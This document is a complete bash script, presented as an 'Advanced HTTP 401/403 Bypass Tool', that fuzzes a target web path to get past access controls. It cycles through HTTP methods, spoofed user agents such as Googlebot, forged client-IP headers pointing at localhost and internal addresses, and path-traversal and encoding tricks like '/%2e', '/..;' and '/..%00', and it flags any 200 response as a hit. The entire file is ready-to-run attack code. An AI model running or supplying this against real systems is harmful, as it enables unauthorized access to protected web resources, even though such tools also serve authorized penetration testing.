#!/bin/bash

# Advanced HTTP 401/403 Bypass Tool
# Usage: bash tool.sh -u https://example.com -path /403/path

# Default parameters
url=""
path=""

# Parse command-line arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u|--url) url="$2"; shift ;;
        -path|--path) path="$2"; shift ;;
        *) echo "Unknown parameter passed: $1"; exit 1 ;;
    esac
    shift
done

# Ensure URL and path are provided
if [[ -z "$url" || -z "$path" ]]; then
    echo -e "\033[1;31mUsage: bash tool.sh -u https://example.com -path /403/path\033[0m"
    exit 1
fi

# Output log
output_file="bypass_results.txt"
echo "Bypassing 403/401 for $url$path" > "$output_file"
echo "Results will be saved to $output_file"
echo "====================================="

# Define lists for fuzzing
methods=("GET" "POST" "PUT" "DELETE" "HEAD" "OPTIONS" "TRACE" "CONNECT" "PATCH" "FOO" "SEARCH" "PROPFIND" "MKCOL" "COPY" "MOVE" "LOCK" "UNLOCK")
user_agents=(
    "Mozilla/5.0 (X11; Linux i686; rv:1.7.13) Gecko/20070322 Kazehakase/0.4.4.1"
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
    "curl/7.68.0"
    "Wget/1.20.3 (linux-gnu)"
    "python-requests/2.25.1"
)
headers=(
    "X-Forwarded-For" "X-Forward-For" "X-Forwarded-Host" "X-Forwarded-Proto"
    "Forwarded" "Via" "X-Real-IP" "X-Remote-IP" "X-Remote-Addr"
    "X-Trusted-IP" "X-Requested-By" "X-Requested-For" "X-Forwarded-Server"
)
header_values=(
    "10.0.0.0" "10.0.0.1" "127.0.0.1" "127.0.0.1:443" 
    "127.0.0.1:80" "localhost" "172.16.0.0"
)
paths=("/%2e$path" "/%252e$path" "/../$path" "/..%00$path" "/~admin$path" "/$path/.." "/$path.." "/.$path" "/..;$path" "/%2e/$path")
protocols=("1.0" "1.1")

# Function to send requests
function send_request {
    method=$1
    ua=$2
    header_key=$3
    header_value=$4
    target_path=$5
    protocol=$6

    response=$(curl -k -s -o /dev/null -w "%{http_code}" \
        -X "$method" \
        -A "$ua" \
        -H "$header_key: $header_value" \
        "$url$target_path" \
        --http"$protocol")
    
    if [[ "$response" == "200" ]]; then
        color="\033[1;32m" # Green
    else
        color="\033[1;31m" # Red
    fi

    # Print and log details
    echo -e "${color}[HTTP $response] -> Method: $method, User-Agent: $ua, Header: $header_key: $header_value, Path: $target_path, Protocol: HTTP/$protocol\033[0m"
    echo "[HTTP $response] -> Method: $method, User-Agent: $ua, Header: $header_key: $header_value, Path: $target_path, Protocol: HTTP/$protocol" >> "$output_file"
}

# Start fuzzing
echo "Starting fuzzing..." >> "$output_file"
for method in "${methods[@]}"; do
    for ua in "${user_agents[@]}"; do
        for header in "${headers[@]}"; do
            for value in "${header_values[@]}"; do
                for p in "${paths[@]}"; do
                    for protocol in "${protocols[@]}"; do
                        send_request "$method" "$ua" "$header" "$value" "$p" "$protocol"
                    done
                done
            done
        done
    done
done

echo "Fuzzing complete. Check $output_file for results."
